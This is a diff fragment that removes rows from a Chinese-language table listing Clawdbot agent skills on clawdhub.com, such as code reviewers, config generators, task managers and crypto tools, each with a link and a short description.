-| Cloudflare 配置生成器 | [Clawdbot/cloudflare-config](https://clawdhub.com/skills/cloudflare-config) | 生成 Cloudflare Workers 配置和代码。在边缘建造时使用。 |
-| Cloudflare 生成器 | [Clawdbot/cloudflare-gen](https://clawdhub.com/skills/cloudflare-gen) | 生成 Cloudflare Workers 配置和代码。在边缘建造时使用。 |
-| 代码审查器 | [Clawdbot/code-reviewer](https://clawdhub.com/skills/code-reviewer) | 用于分阶段 git 更改的 AI 代码审查。当您在承诺之前需要第二双眼睛时使用。 |
-| 代码审查器（幽默版） | [Clawdbot/code-roaster](https://clawdhub.com/skills/code-roaster) | 以残酷的诚实和实际有用的反馈来测试你的代码。当用户想要进行有趣、野蛮的代码审查以捕获不良模式和命名犯罪时使用。 |
-| CodeConductor.ai | [Clawdbot/codeconductor](https://clawdhub.com/skills/codeconductor) | （无） |
-| Codex 账户切换器 | [Clawdbot/codex-account-switcher](https://clawdhub.com/skills/codex-account-switcher) | 管理多个 OpenAI Codex 帐户。捕获当前的登录令牌并立即在它们之间切换。 |
-| Codex 编排 | [Clawdbot/codex-orchestration](https://clawdhub.com/skills/codex-orchestration) | Codex 的通用编排。使用 update_plan 加上后台 PTY 终端来运行并行 Codex exec 工作程序。 |
-| Codex CLI | [Clawdbot/codex-sub-agents](https://clawdhub.com/skills/codex-sub-agents) | 使用 OpenAI Codex CLI 执行编码任务。触发器：codex、代码审查、修复 CI、重构代码、实现功能、编码代理、gpt-5-codex。使 Clawdbot 能够将编码工作委托给 Codex CLI 作为子代理或直接工具。 |
-| 上下文压缩器 | [Clawdbot/context-compressor](https://clawdhub.com/skills/context-compressor) | （无） |
-| 上下文工程 | [Clawdbot/context-engineering](https://clawdhub.com/skills/context-engineering) | 当用户要求“压缩上下文”、“总结对话历史记录”、“实施压缩”、“减少令牌使用”或提及上下文压缩、结构化摘要、每个任务令牌优化或超出上下文限制的长时间运行代理会话时，应使用此技能。 |
-| Conventional Commits | [Clawdbot/conventional-commits](https://clawdhub.com/skills/conventional-commits) | 使用常规提交规范格式化提交消息。在创建提交、编写提交消息或用户提及提交、git 提交或提交消息时使用。确保提交遵循自动化工具、变更日志生成和语义版本控制的标准格式。 |
-| 测试覆盖率提升器 | [Clawdbot/coverage-booster](https://clawdhub.com/skills/coverage-booster) | 查找未经测试的代码路径并生成测试以提高覆盖率。当您的测试覆盖率太低并且需要填补空白时使用。 |
-| CoW Swap DEX 聚合器 | [Clawdbot/cow-swap](https://clawdhub.com/skills/cow-swap) | CoW Swap 受 MEV 保护的 DEX 聚合器。批量拍卖以实现最佳执行和盈余共享。 |
-| CLI 设计器 | [Clawdbot/create-cli](https://clawdhub.com/skills/create-cli) | 设计命令行界面参数和用户体验：参数、标志、子命令、帮助文本、输出格式、错误消息、退出代码、提示、配置/环境优先级和安全/空运行行为。当您设计 CLI 规范（在实现之前）或重构现有 CLI 的表面区域以实现一致性、可组合性和可发现性时使用。 |
-| 创作者权益助理 | [Clawdbot/creator-rights-assistant](https://clawdhub.com/skills/creator-rights-assistant) | 在创建时对出处、归属和许可元数据进行标准化，以便您的内容可以在平台上干净地传播。 |
-| 加密货币价格 | [Clawdbot/crypto-price](https://clawdhub.com/skills/crypto-price) | 通过 CoinGecko API 或 Hyperliquid API 获取加密货币代币价格并生成蜡烛图。当用户询问代币价格、加密货币价格、价格图表或加密货币市场数据时使用。 |
-| 每日回顾仪式 | [Clawdbot/daily-review-ritual](https://clawdhub.com/skills/daily-review-ritual) | 日终回顾以获取进展、见解并计划明天 |
-| 调试专业版 | [Clawdbot/debug-pro](https://clawdhub.com/skills/debug-pro) | （无） |
-| DeFi 协议交互 | [Clawdbot/defi](https://clawdhub.com/skills/defi) | DeFi 协议交互。通过 DEX 聚合器交换代币、检查收益率、跟踪以太坊、Polygon、Arbitrum 和 Solana 上的仓位。 |
-| 部署代理 | [Clawdbot/deploy-agent](https://clawdhub.com/skills/deploy-agent) | 适用于全栈应用程序的多步骤部署代理。构建 → 测试 → GitHub → Cloudflare 页面，每一步都经过人工批准。 |
-| Detox Counter | [Clawdbot/detox-counter](https://clawdhub.com/skills/detox-counter) | 通过可定制的计数器、症状记录和进度里程碑来跟踪任何排毒情况 |
-| 设备助手 | [Clawdbot/device-assistant](https://clawdhub.com/skills/device-assistant) | 个人设备和设备管理器，具有错误代码查找和故障排除功能。跟踪您的所有设备（电器、电子产品、软件）的型号、手册和保修信息。当出现问题时，告诉它错误代码并立即获得解决方案。使用时：设备显示错误、需要手册、保修检查、添加新设备、维护提醒。触发器：/device、/geräte、“mein Geschirrspüler”、“Fehler E24”、“Fehlermeldung”、设备问题、设备问题。 |
-| dexter | [Clawdbot/dexter](https://clawdhub.com/skills/dexter) | 用于股票分析、财务报表、指标、价格、SEC 文件和加密数据的自主金融研究代理。 |
-| 图表生成器 | [Clawdbot/diagram-gen](https://clawdhub.com/skills/diagram-gen) | 从您的代码库生成美人鱼图。当您需要架构可视化时使用。 |
-| Git Diff 摘要器 | [Clawdbot/diff-summarizer](https://clawdhub.com/skills/diff-summarizer) | 生成 git diff 的人类可读的摘要。当您需要解释发生了什么变化时使用。 |
-| ESLint 配置生成器 | [Clawdbot/eslint-config-gen](https://clawdhub.com/skills/eslint-config-gen) | 生成与您的代码风格匹配的 ESLint 配置。设置 linting 时使用。 |
-| ESLint 配置生成器 | [Clawdbot/eslint-gen](https://clawdhub.com/skills/eslint-gen) | 从您的代码库模式生成 ESLint 配置。设置 linting 时使用。 |
-| 以太坊开发导师 | [Clawdbot/ethereum-wingman](https://clawdhub.com/skills/ethereum-wingman) | 以太坊开发导师和 Scaffold-ETH 2 项目的构建者。触发“构建”、“创建”、“dApp”、“智能合约”、“Solidity”、“DeFi”、“以太坊”、“web3”或任何区块链开发任务。始终使用分叉模式来测试真实的协议状态。 |
-| 计划执行 | [Clawdbot/executing-plans](https://clawdhub.com/skills/executing-plans) | 当您有书面实施计划并在带有审查检查点的单独会话中执行时使用 |
-| Cron 作业修复 | [Clawdbot/ez-cronjob](https://clawdhub.com/skills/ez-cronjob) | 修复 Clawdbot/Moltbot 中常见的 cron 作业失败 - 消息传递问题、工具超时、时区错误和模型回退问题。 |
-| Fear Greed | [Clawdbot/fear-greed](https://clawdhub.com/skills/fear-greed) | 使用 Strykr PRISM API 的加密恐惧和贪婪指数小部件。用于网站和仪表板的嵌入式仪表、条形图和徽章组件。 |
-| 第一原理分解器 | [Clawdbot/first-principles-decomposer](https://clawdhub.com/skills/first-principles-decomposer) | 将任何问题分解为基本事实，然后从原子开始重建解决方案。当用户说“第一”、“第一原理”、“从头开始”、“我们假设什么”、“分解”、“原子”、“基本真理”、“物理思维”、“埃隆方法”、“基石”、“基础”、“核心问题”、“剥离”或挑战有关事情如何完成的假设时使用。 |
-| Focus Deep Work | [Clawdbot/focus-deep-work](https://clawdhub.com/skills/focus-deep-work) | 通过专注会议、干扰记录和生产力跟踪最大限度地提高深度工作 |
-| Food Order | [Clawdbot/food-order](https://clawdhub.com/skills/food-order) | 重新订购 Foodora 订单 + 使用 ordercli 跟踪预计到达时间/状态。未经用户明确批准，切勿确认。触发因素：订餐、重新订购、跟踪预计到达时间。 |
-| 前端设计系统 | [Clawdbot/frontend-design](https://clawdhub.com/skills/frontend-design) | 创建具有高设计质量的独特的生产级前端界面。当用户要求构建 Web 组件、页面或应用程序时，请使用此技能。生成富有创意、精美的代码，避免通用人工智能美学。 |
-| 前端设计系统 | [Clawdbot/frontend-design-1-0-0](https://clawdhub.com/skills/frontend-design-1-0-0) | 创建具有高设计质量的独特的生产级前端界面。当用户要求构建 Web 组件、页面或应用程序时，请使用此技能。生成富有创意、精美的代码，避免通用人工智能美学。 |
-| GitHub | [Clawdbot/github](https://clawdhub.com/skills/github) | 使用“gh” CLI 与 GitHub 交互。使用“gh issues”、“gh pr”、“gh run”和“gh api”来处理问题、PR、CI 运行和高级查询。 |
-| GitHub PAT | [Clawdbot/github-pat](https://clawdhub.com/skills/github-pat) | 使用个人访问令牌与 GitHub 进行交互。安全、用户控制的访问 - 没有 OAuth，没有完整的帐户访问权限。克隆、推送、分支、PR、问题。当用户想要使用 GitHub 存储库时使用。 |
-| GitHub Token | [Clawdbot/github-token](https://clawdhub.com/skills/github-token) | 使用个人访问令牌与 GitHub 进行交互。安全、用户控制的访问 - 没有 OAuth，没有完整的帐户访问权限。克隆、推送、分支、PR、问题。当用户想要使用 GitHub 存储库时使用。 |
-| Gitignore 生成器 | [Clawdbot/gitignore-gen](https://clawdhub.com/skills/gitignore-gen) | 通过分析您的项目生成 .gitignore。设置新存储库时使用。 |
-| Gold Price MCP | [Clawdbot/gold-price-mcp](https://clawdhub.com/skills/gold-price-mcp) | api api กลางของประเทศไทย |
-| Gurkerl.at | [Clawdbot/gurkerl](https://clawdhub.com/skills/gurkerl) | Gurkerl.at 通过 MCP 进行杂货购物 - 搜索产品、管理购物车、订单、食谱、收藏夹。 |
-| Hevy | [Clawdbot/hevy](https://clawdhub.com/skills/hevy) | 从 Hevy 查询锻炼数据，包括锻炼、例程、练习和历史记录。当用户询问他们的锻炼、健身课程、锻炼进度或健身习惯时使用。 |
-| HN Digest | [Clawdbot/hn-digest](https://clawdhub.com/skills/hn-digest) | 按需获取并发送黑客新闻头版帖子。当用户询问 HN、说“hn”、“pull HN”、“hn 10”或指定“hn health”、“hn hacking”或“hn tech”等主题时使用。将 N 个（默认 5）个帖子作为带有标题 + 链接的单独消息发送。排除加密货币。 |
-| 全屋音乐控制 | [Clawdbot/home-music](https://clawdhub.com/skills/home-music) | 结合 Spotify 播放和 Airfoil 扬声器路由来控制全屋音乐场景。快速预设早晨、聚会、放松模式。 |
-| Husky Git Hooks | [Clawdbot/husky-config-gen](https://clawdhub.com/skills/husky-config-gen) | 设置适合您的项目的 git hook。添加预提交挂钩时使用。 |
-| Husky Git Hooks | [Clawdbot/husky-gen](https://clawdhub.com/skills/husky-gen) | 设置适合您的项目的 git hook。添加预提交挂钩时使用。 |
-| 面试问题生成器 | [Clawdbot/interview-gen](https://clawdhub.com/skills/interview-gen) | 从您的代码库生成面试问题。招聘开发人员时使用。 |
-| 面试准备生成器 | [Clawdbot/interview-prep](https://clawdhub.com/skills/interview-prep) | 从您的代码库生成面试问题。招聘开发人员时使用。 |
-| 反转策略师 | [Clawdbot/inversion-strategist](https://clawdhub.com/skills/inversion-strategist) | 把问题颠倒过来——不要问“如何成功”，而要问“如何绝对失败”，然后避开这些道路。当用户说“反转”、“反转”、“翻转它”、“相反的方法”、“这会如何失败”、“避免失败”、“不该做什么”、“芒格”、“反目标”、“保证失败”时使用。 |
-| JIRA 项目管理 | [Clawdbot/jira](https://clawdhub.com/skills/jira) | 通过 jira-cli 管理 Jira 问题、看板、冲刺和项目。直接从命令行搜索、创建、更新和转换问题。 |
-| JTBD Analyzer | [Clawdbot/jtbd-analyzer](https://clawdhub.com/skills/jtbd-analyzer) | 揭示客户雇用您的产品来完成的真正“工作”。超越功能来理解功能、情感和社会动机。当用户说“要完成的工作”、“jtbd”、“客户为什么这样做”、“什么工作”、“客户动机”、“什么问题”、“用户需求”、“人们为什么购买”时使用。 |
-| Kimi AI 集成 | [Clawdbot/kimi-integration](https://clawdhub.com/skills/kimi-integration) | 将 Moonshot AI (Kimi) 和 Kimi Code 模型集成到 Clawdbot 中的分步指南。当有人询问如何添加 Kimi 模型、配置 Moonshot AI 或在 Clawdbot 中设置 Kimi 进行编码时使用。 |
-| Landing Page 生成器 | [Clawdbot/landing-gen](https://clawdhub.com/skills/landing-gen) | 从 package.json 生成漂亮的 HTML 登陆页面。当您需要为您的项目提供快速营销页面时使用。 |
-| Last 30 Days | [Clawdbot/last30days](https://clawdhub.com/skills/last30days) | 在 Reddit + X + Web 上研究过去 30 天内的任何主题，综合研究结果，并编写可复制粘贴的提示。当用户想要对某个主题进行最新的社交/网络研究、询问“人们对 X 有何看法”或想要了解当前的最佳实践时使用。需要 OPENAI_API_KEY 和/或 XAI_API_KEY 才能进行完整的 Reddit+X 访问，退回到网络搜索。 |
-| 过去30天研究 | [Clawdbot/last30days-lite](https://clawdhub.com/skills/last30days-lite) | 研究过去 30 天内 Reddit、X/Twitter 和网络上的任何主题。将发现综合为可操作的见解或复制粘贴提示。 |
-| 许可证生成器 | [Clawdbot/license-gen](https://clawdhub.com/skills/license-gen) | 为您的项目选择并生成正确的许可证。在许可开源时使用。 |
-| Literature Review | [Clawdbot/literature-review](https://clawdhub.com/skills/literature-review) | 通过 Semantic Sc​​holar、OpenAlex、Crossref 和 PubMed API 搜索学术资源，协助撰写文献综述。当用户需要查找某个主题的论文、获取特定 DOI 的详细信息或起草带有适当引用的文献综述部分时使用。 |
-| Manus AI Agent | [Clawdbot/manus](https://clawdhub.com/skills/manus) | 通过 Manus API 创建和管理 AI 代理任务。 Manus 是一个自主人工智能代理，可以浏览网络、使用工具并交付完整的工作产品。 |
-| Marketing Mode | [Clawdbot/marketing-mode](https://clawdhub.com/skills/marketing-mode) | 营销模式结合了23种全面的营销技巧，涵盖策略、心理、内容、SEO、转化优化和付费增长。当用户需要营销策略、文案、SEO 帮助、转化优化、付费广告或任何营销策略时使用。 |
-| Git 合并冲突解决 | [Clawdbot/merge-resolver](https://clawdhub.com/skills/merge-resolver) | 使用 AI 智能解决 git 合并冲突。当用户有合并冲突需要帮助解决时使用。 |
-| Middleware 生成器 | [Clawdbot/middleware-gen](https://clawdhub.com/skills/middleware-gen) | 从简单的英语生成 Express 中间件。构建 API 中间件时使用。 |
-| 正念冥想 | [Clawdbot/mindfulness-meditation](https://clawdhub.com/skills/mindfulness-meditation) | 通过指导课程、连续练习和正念提醒来建立冥想练习 |
-| Miniflux RSS 阅读器 | [Clawdbot/miniflux](https://clawdhub.com/skills/miniflux) | 浏览、阅读和管理 Miniflux feed 文章。当 Claude 需要通过 Miniflux 处理 RSS/atom 提要时使用 - 列出未读/新文章、阅读文章内容、将文章标记为已读以及管理提要/类别。提供具有灵活输出格式（标题、摘要、完整内容）的 CLI 访问。 |
-| 增肌追踪 | [Clawdbot/muscle-gain](https://clawdhub.com/skills/muscle-gain) | 通过体重进展、蛋白质跟踪和力量里程碑来跟踪肌肉锻炼 |
-| Git Stash 命名器 | [Clawdbot/name-gen](https://clawdhub.com/skills/name-gen) | 根据您的更改生成有意义的 git stash 名称。存放工作时使用。 |
-| 变量命名生成器 | [Clawdbot/naming-gen](https://clawdhub.com/skills/naming-gen) | 在代码中建议更好的变量和函数名称。在提高代码可读性时使用。 |
-| Netatmo 智能家居 | [Clawdbot/netatmo](https://clawdhub.com/skills/netatmo) | 控制 Netatmo 恒温器并读取气象站数据。用于加热控制（设置温度、更改模式）、检查室内/室外温度、二氧化碳水平、湿度、噪音和压力读数。 |
-| Next.js 配置生成器 | [Clawdbot/next-config-gen](https://clawdhub.com/skills/next-config-gen) | 使用最佳实践生成 Next.js 配置。配置 Next.js 时使用。 |
-| Night Routine | [Clawdbot/night-routine](https://clawdhub.com/skills/night-routine) | 通过放松习惯、睡眠准备和第二天的计划来建立一个宁静的夜间习惯 |
-| Noir 开发 | [Clawdbot/noir-developer](https://clawdhub.com/skills/noir-developer) | 开发 Noir (.nr) 代码库。在使用 Noir 创建项目或编写代码时使用。 |
-| Office Quotes | [Clawdbot/office-quotes](https://clawdhub.com/skills/office-quotes) | 从 Office（美国）生成随机报价。通过 akashrajpurohit API 提供对 326 个离线报价以及包含 SVG 卡、角色头像和完整剧集元数据的在线模式的访问。用于娱乐、破冰或任何需要 Office 报价的任务。 |
-| OpenCode ACP 控制 | [Clawdbot/opencode-acp-control](https://clawdhub.com/skills/opencode-acp-control) | 通过代理客户端协议 (ACP) 直接控制 OpenCode。启动会话、发送提示、恢复对话以及管理 OpenCode 更新。 |
-| OpenCode 控制器 | [Clawdbot/opencode-controller](https://clawdhub.com/skills/opencode-controller) | 通过斜杠命令控制和操作Opencode。使用此技能来管理会话、选择模型、切换代理（计划/构建）以及通过 Opencode 协调编码。 |
-| 问题解决框架 | [Clawdbot/overcome-problem](https://clawdhub.com/skills/overcome-problem) | 通过结构化思维、行动计划和进度跟踪来解决任何问题 |
-| Paprika | [Clawdbot/paprika](https://clawdhub.com/skills/paprika) | 从 Paprika Recipe Manager 访问食谱、膳食计划和购物清单。当用户询问食谱、膳食计划或烹饪时使用。 |
-| Perry 编码代理 | [Clawdbot/perry-coding-agents](https://clawdhub.com/skills/perry-coding-agents) | 将编码任务分派到 Perry 工作区上的 OpenCode 或 Claude Code。用于开发工作、PR 审查或任何需要隔离环境的编码任务。 |
-| Pitch Deck 生成器 | [Clawdbot/pitch-deck-gen](https://clawdhub.com/skills/pitch-deck-gen) | 生成初创公司宣传材料内容。在筹款或演示时使用。 |
-| Planka 项目管理 | [Clawdbot/planka](https://clawdhub.com/skills/planka) | 通过自定义 Python CLI 管理 Planka（看板）项目、看板、列表、卡片和通知。 |
-| Planka 项目管理 | [Clawdbot/planka-cli](https://clawdhub.com/skills/planka-cli) | 通过自定义 Python CLI 管理 Planka（看板）项目、看板、列表、卡片和通知。 |
-| Polymarket 分析 | [Clawdbot/polymarket-analysis](https://clawdhub.com/skills/polymarket-analysis) | 分析 Polymarket 预测市场的交易优势。货币对成本套利、鲸鱼追踪、情绪分析、动量信号。没有执行。 |
-| 奥地利邮政追踪 | [Clawdbot/post-at](https://clawdhub.com/skills/post-at) | 管理奥地利邮政 (post.at) 投递 - 列出包裹、检查投递状态、设置投递地点首选项。 |
-| Pre-Mortem 分析器 | [Clawdbot/pre-mortem-analyst](https://clawdhub.com/skills/pre-mortem-analyst) | 想象一下该项目已经失败了，然后向后查找原因。比风险评估更强大，因为它假设失败是肯定的。当用户说“事前剖析”、“事前剖析”、“想象一下失败了”、“可能会出什么问题”、“风险分析”、“在我们启动之前”、“压力测试”、“什么会杀死这个”、“项目风险”时使用。 |
-| 预取建议器 | [Clawdbot/prefetch-gen](https://clawdhub.com/skills/prefetch-gen) | 获取有关要预取的路线和数据的 AI 建议。优化导航时使用。 |
-| 预取建议器 | [Clawdbot/prefetch-suggester](https://clawdhub.com/skills/prefetch-suggester) | 获取有关要预取的路线和数据的 AI 建议。优化导航时使用。 |
-| 打印机管理 | [Clawdbot/printer](https://clawdhub.com/skills/printer) | 在 macOS 上通过 CUPS 管理打印机（发现、添加、打印、队列、状态、唤醒）。 |
-| Prism Alerts | [Clawdbot/prism-alerts](https://clawdhub.com/skills/prism-alerts) | 使用 Strykr PRISM API 的 Pump.fun 令牌警报。获取 Solana 上新代币发布、毕业和交易量峰值的实时通知。 |
-| Prisma 生成器 | [Clawdbot/prisma-gen](https://clawdhub.com/skills/prisma-gen) | 从简单的英语生成 Prisma 模式。当您需要快速数据库模型而不编写样板时使用。 |
-| Prisma Schema 生成器 | [Clawdbot/prisma-schema-gen](https://clawdhub.com/skills/prisma-schema-gen) | 从简单的英语生成 Prisma 模式。启动数据库模式时使用。 |
-| Project Manager | [Clawdbot/project-manager](https://clawdhub.com/skills/project-manager) | （无） |
-| Project Scaffold | [Clawdbot/project-scaffold](https://clawdhub.com/skills/project-scaffold) | （无） |
-| 提示工程专家 | [Clawdbot/prompt-engineering-expert](https://clawdhub.com/skills/prompt-engineering-expert) | AI 代理提示工程、自定义指令设计和提示优化方面的高级专家 |
-| Proxmox | [Clawdbot/proxmox](https://clawdhub.com/skills/proxmox) | 通过 REST API 管理 Proxmox VE 集群。当用户要求列出、启动、停止、重新启动 VM 或 LXC 容器、检查节点状态、创建快照、查看任务或管理 Proxmox 基础设施时使用。需要配置 API 令牌或凭据。 |
-| Rate Limiter 生成器 | [Clawdbot/rate-limit-gen](https://clawdhub.com/skills/rate-limit-gen) | 生成速率限制配置。在保护 API 免遭滥用时使用。 |
-| Rate Limiter | [Clawdbot/rate-limiter](https://clawdhub.com/skills/rate-limiter) | 使用 AI 生成速率限制配置。在保护 API 免遭滥用时使用。 |
-| Reasoning Personas | [Clawdbot/reasoning-personas](https://clawdhub.com/skills/reasoning-personas) | 激活不同的高能动性思维模式以解锁更好的推理。在集思广益、审查计划、做出决定时使用，或者当用户说“戴上你的奇闻趣事帽子”、“魔鬼拥护者这个”或“有哪些先例适用？”时使用。 |
-| Reddit Insights | [Clawdbot/reddit-insights](https://clawdhub.com/skills/reddit-insights) | 通过 reddit-insights.com MCP 服务器使用语义 AI 搜索来搜索和分析 Reddit 内容。 在需要执行以下操作时使用：(1) 查找用户对产品创意的痛点和挫败感，(2) 发现利基市场或未得到满足的需求，(3) 研究人们对产品/主题的真正想法，(4) 从真实讨论中寻找内容灵感，(5) 分析 Reddit 上的情绪和趋势，(6) 通过真实的用户反馈验证商业创意。 触发因素：reddit 搜索、查找痛点、市场研究、用户反馈、人们在想什么、reddit 趋势、利基发现、产品验证。 |
-| Reddit 只读 | [Clawdbot/reddit-read-only](https://clawdhub.com/skills/reddit-read-only) | 使用公共 JSON 端点以只读模式浏览和搜索 Reddit。当用户要求浏览 subreddits、按主题搜索帖子、检查评论线程或构建要手动查看和回复的链接候选列表时使用。 |
-| 重构助手 | [Clawdbot/refactor-assist](https://clawdhub.com/skills/refactor-assist) | 通过彩色差异获取重构建议。提高代码质量时使用。 |
-| 重构助手 | [Clawdbot/refactor-suggest](https://clawdhub.com/skills/refactor-suggest) | 通过彩色差异获取重构建议。提高代码质量时使用。 |
-| 重构助手 | [Clawdbot/refactorer](https://clawdhub.com/skills/refactorer) | 通过彩色差异获取重构建议。提高代码质量时使用。 |
-| Rei Qwen3 Coder | [Clawdbot/rei](https://clawdhub.com/skills/rei) | 将 Rei Qwen3 Coder 设置为模型提供者。在配置 coder.reilabs.org、将 Rei 添加到 Clawdbot 或对 Rei 端点的 403 错误进行故障排除时使用。 |
-| Relationship Skills | [Clawdbot/relationship-skills](https://clawdhub.com/skills/relationship-skills) | 通过沟通工具、冲突解决和联系理念改善关系 |
-| Release Gen | [Clawdbot/release-gen](https://clawdhub.com/skills/release-gen) | 从提交历史记录生成语义版本冲突和 git 标签。准备发布时使用。 |
-| Resume Builder | [Clawdbot/resume-builder](https://clawdhub.com/skills/resume-builder) | 生成符合反应式简历架构的专业简历。当用户想要通过对话式 AI 创建、构建或生成简历，或询问简历结构、部分或内容时使用。此技能指导代理提出澄清问题、避免幻觉并为 https://rxresu.me 生成有效的 JSON 输出。 |
-| Resume 生成器 | [Clawdbot/resume-gen](https://clawdhub.com/skills/resume-gen) | 生成并改进开发人员简历。找工作时使用。 |
-| Roast Gen | [Clawdbot/roast-gen](https://clawdhub.com/skills/roast-gen) | 用幽默和实际有用的反馈来测试你的代码。当您想要诚实的代码审查时使用。 |
-| Scrappa MCP | [Clawdbot/scrappa-skill](https://clawdhub.com/skills/scrappa-skill) | 通过模型上下文协议访问 Scrappa 的 MCP 服务器，用于 Google、YouTube、Amazon、LinkedIn、Trustpilot、航班、酒店等 |
-| SearXNG 搜索 | [Clawdbot/searxng-metasearch](https://clawdhub.com/skills/searxng-metasearch) | 使用自托管 SearXNG 实例搜索网络。尊重隐私的元搜索，聚合来自多个引擎的结果。 |
-| SearXNG 搜索 | [Clawdbot/searxng-self-hosted](https://clawdhub.com/skills/searxng-self-hosted) | 使用自托管 SearXNG 实例搜索网络。尊重隐私的元搜索，聚合来自多个引擎的结果。 |
-| Self Improving Agent | [Clawdbot/self-improving-agent](https://clawdhub.com/skills/self-improving-agent) | 捕获经验教训、错误和纠正，以实现持续改进。在以下情况下使用：(1) 命令或操作意外失败，(2) 用户纠正 Claude（“不，那是错误的...”、“实际上...”），(3) 用户请求不存在的功能，(4) 外部 API 或工具失败，(5) Claude 意识到其知识过时或不正确，(6) 为重复任务发现了更好的方法。还要在主要任务之前回顾所学知识。 |
-| Self Improving Agent | [Clawdbot/self-improving-agent-1-0-0](https://clawdhub.com/skills/self-improving-agent-1-0-0) | 捕获经验教训、错误和纠正，以实现持续改进。在以下情况下使用：(1) 命令或操作意外失败，(2) 用户纠正 Claude（“不，那是错误的...”、“实际上...”），(3) 用户请求不存在的功能，(4) 外部 API 或工具失败，(5) Claude 意识到其知识过时或不正确，(6) 为重复任务发现了更好的方法。还要在主要任务之前回顾所学知识。 |
-| Self Improving Agent | [Clawdbot/self-improving-agent-1-0-1](https://clawdhub.com/skills/self-improving-agent-1-0-1) | 捕获经验教训、错误和纠正，以实现持续改进。在以下情况下使用：(1) 命令或操作意外失败，(2) 用户纠正 Claude（“不，那是错误的...”、“实际上...”），(3) 用户请求不存在的功能，(4) 外部 API 或工具失败，(5) Claude 意识到其知识过时或不正确，(6) 为重复任务发现了更好的方法。还要在主要任务之前回顾所学知识。 |
-| Self Improving Agent | [Clawdbot/self-improving-agent-1-0-2](https://clawdhub.com/skills/self-improving-agent-1-0-2) | 捕获经验教训、错误和纠正，以实现持续改进。在以下情况下使用：(1) 命令或操作意外失败，(2) 用户纠正 Claude（“不，那是错误的...”、“实际上...”），(3) 用户请求不存在的功能，(4) 外部 API 或工具失败，(5) Claude 意识到其知识过时或不正确，(6) 为重复任务发现了更好的方法。还要在主要任务之前回顾所学知识。 |
-| Social Media Detox | [Clawdbot/social-media-detox](https://clawdhub.com/skills/social-media-detox) | 通过无屏幕条纹、冲动追踪和数字健康来打破社交媒体成瘾 |
-| Solana Pay | [Clawdbot/solana-pay](https://clawdhub.com/skills/solana-pay) | Solana Pay 协议集成。在 Solana 区块链上生成付款请求、二维码并验证交易。 |
-| Spotify Player | [Clawdbot/spotify-player](https://clawdhub.com/skills/spotify-player) | 终端 Spotify 通过 spogo（首选）或 spotify_player 播放/搜索。 |
-| Stash Name Generator | [Clawdbot/stash-name-gen](https://clawdhub.com/skills/stash-name-gen) | 根据您的更改生成有意义的 git stash 名称。存放工作时使用。 |
-| Stash Name Generator | [Clawdbot/stash-namer](https://clawdhub.com/skills/stash-namer) | 使用 AI 为您的 git 存储库命名有意义。当您想稍后找到您的藏品时使用。 |
-| Steam Games CLI | [Clawdbot/steam](https://clawdhub.com/skills/steam) | 浏览、筛选和发现 Steam 库中的游戏。按游戏时间、评论、Steam Deck 兼容性、流派和标签进行过滤。当用户询问他们的 Steam 游戏、玩什么、游戏推荐或 Steam Deck 兼容游戏时使用。 |
-| Stock Price Checker | [Clawdbot/stock-price-checker](https://clawdhub.com/skills/stock-price-checker) | 使用 yfinance 库检查股票价格。无需 API 密钥。 |
-| Substack Formatter | [Clawdbot/substack-formatter](https://clawdhub.com/skills/substack-formatter) | 将纯文本转换为具有适当 HTML 格式的 Substack 文章格式，以便复制粘贴到 Substack 编辑器中。 |
-| Supabase RLS 生成器 | [Clawdbot/supabase-rls-gen](https://clawdhub.com/skills/supabase-rls-gen) | 从 Prisma 架构生成 Supabase RLS 策略。在保护数据库时使用。 |
-| Supabase Schema 生成器 | [Clawdbot/supabase-schema-gen](https://clawdhub.com/skills/supabase-schema-gen) | 从 Prisma 架构生成 Supabase RLS 策略。在保护数据库时使用。 |
-| Supabase Users | [Clawdbot/supabase-users](https://clawdhub.com/skills/supabase-users) | 查询 Supabase 项目 - 计算用户数量、列出注册情况、检查统计信息。用于数据库查询和用户分析。 |
-| Realtime Web Search | [Clawdbot/super-websearch-realtime](https://clawdhub.com/skills/super-websearch-realtime) | 优先实时网络搜索实时信息 |
-| Terraform 生成器 | [Clawdbot/terraform-gen](https://clawdhub.com/skills/terraform-gen) | 生成 Terraform 基础设施配置。在配置云资源时使用。 |
-| Thinking Partner | [Clawdbot/thinking-partner](https://clawdhub.com/skills/thinking-partner) | 通过提问探索复杂问题的协作思维伙伴 |
-| TickTick CLI | [Clawdbot/ticktick](https://clawdhub.com/skills/ticktick) | 使用 OAuth2 身份验证、批量操作和速率限制处理从命令行管理 TickTick 任务和项目。 |
-| TickTick API | [Clawdbot/ticktick-api](https://clawdhub.com/skills/ticktick-api) | TickTick 任务管理器集成。列出项目和任务、创建新任务、完成任务、删除任务。当用户想要管理其待办事项列表、添加提醒、检查待处理任务或将任务标记为已完成时使用。需要通过“ticktick-setup”进行 OAuth 设置。 |
-| TickTick 任务管理 | [Clawdbot/ticktick-tasks](https://clawdhub.com/skills/ticktick-tasks) | TickTick 任务管理器集成。列出项目和任务、创建新任务、完成任务、删除任务。当用户想要管理其待办事项列表、添加提醒、检查待处理任务或将任务标记为已完成时使用。需要通过“ticktick-setup”进行 OAuth 设置。 |
-| Tmux Agents | [Clawdbot/tmux-agents](https://clawdhub.com/skills/tmux-agents) | 管理 tmux 会话中的后台编码代理。生成 Claude Code 或其他代理，检查进度，获取结果。 |
-| Todo | [Clawdbot/todo](https://clawdhub.com/skills/todo) | 任务和待办事项列表管理。创建、组织和跟踪具有优先级和截止日期的任务。 |
-| Todoist | [Clawdbot/todoist](https://clawdhub.com/skills/todoist) | 在Todoist中管理任务和项目。当用户询问任务、待办事项、提醒或生产力时使用。 |
-| Todoist CLI | [Clawdbot/todoist-cli](https://clawdhub.com/skills/todoist-cli) | 通过“todoist”CLI 管理 Todoist 任务、项目、标签和部分。当用户要求添加/完成/列出任务、显示今天的任务、搜索任务或管理项目时使用。 |
-| Todoist Manager | [Clawdbot/todoist-manager](https://clawdhub.com/skills/todoist-manager) | 通过todoist CLI包装器管理Todoist任务、项目、标签和评论。当用户要求添加任务、列出待办事项、完成项目、管理项目或与其 Todoist 帐户交互时使用。 |
-| topydo | [Clawdbot/topydo](https://clawdhub.com/skills/topydo) | 使用 topydo CLI 管理 todo.txt 任务。添加、列出、完成、确定优先顺序、标记和组织具有依赖性、截止日期、重复周期和项目的任务。用于任何任务管理、待办事项列表，或当用户提及任务、待办事项或 todo.txt 时。 |
